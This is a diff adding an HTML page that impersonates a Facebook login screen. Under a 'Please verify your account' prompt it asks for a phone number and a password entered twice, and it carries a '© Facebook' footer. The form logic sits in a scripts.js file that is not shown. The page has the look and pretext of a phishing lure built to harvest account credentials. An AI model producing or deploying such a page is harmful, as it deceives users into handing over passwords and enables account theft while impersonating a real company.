@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+<body>
+    <div class="login-container">
+        <h2>Facebook Login</h2>
+        <p class="verification">Please verify your account</p>
+        <div class="input-container">
+            <span class="icon">📞</span>
+            <input type="tel" id="phone" placeholder="Phone Number">
+        </div>
+        <div class="input-container">
+            <span class="icon">🔒</span>
+            <input type="password" id="password1" placeholder="Password">
+        </div>
+        <div class="input-container">
+            <span class="icon">🔒</span>
+            <input type="password" id="password2" placeholder="Confirm Password">
+        </div>
+        <button onclick="validateForm()">Login</button>
+        <p class="error" id="errorMessage"></p>
+        <div class="footer">© Facebook</div>
+    </div>
+    <script src="scripts.js"></script>
+</body>
+</html>
